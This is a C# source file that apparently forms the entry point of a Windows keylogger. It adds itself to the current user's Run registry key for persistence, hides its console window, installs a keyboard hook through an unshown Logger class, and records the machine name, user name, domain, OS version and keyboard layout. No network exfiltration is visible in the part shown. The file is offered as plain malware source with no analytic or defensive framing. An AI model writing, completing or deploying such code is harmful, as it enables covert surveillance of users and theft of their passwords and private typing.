using System;
using System.Windows.Forms;
using Microsoft.Win32;




namespace ConsoleApplication1
{
    class Program
    {
        public static void AddApplicationToStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("My Program", "\"" + Application.ExecutablePath + "\"");
            }
        }



        [STAThread]
        static void Main(string[] args)
        {



            AddApplicationToStartup();


            var handle = Logger.GetConsoleWindow();


            Logger.ShowWindow(handle, Logger.SW_HIDE);


            Logger._hookID = Logger.SetHook(Logger._proc);
  

            Logger.Writer("CurrentDirectory: {0}" + Environment.CurrentDirectory + "\n");
            Logger.Writer("MachineName: {0}" + Environment.MachineName + "\n");
            Logger.Writer("OSVersion: {0}" + Environment.OSVersion.ToString() + "\n");
            Logger.Writer("SystemDirectory: {0}" + Environment.SystemDirectory + "\n");
            Logger.Writer("UserDomainName: {0}" + Environment.UserDomainName + "\n");
            Logger.Writer("UserInteractive: {0}" + Environment.UserInteractive + "\n");
            Logger.Writer("UserName: {0}" + Environment.UserName + "\n");


            string htmlData = Logger.GetBuff();



            ushort lang = Logger.GetKeyboardLayout();
            Logger.mss = lang.ToString();

            Logger.Writer("Первоначальная раскладка: " + Logger.mss + "\n");

            Application.Run();


            Logger.UnhookWindowsHookEx(Logger._hookID);
        }


        

    }
}
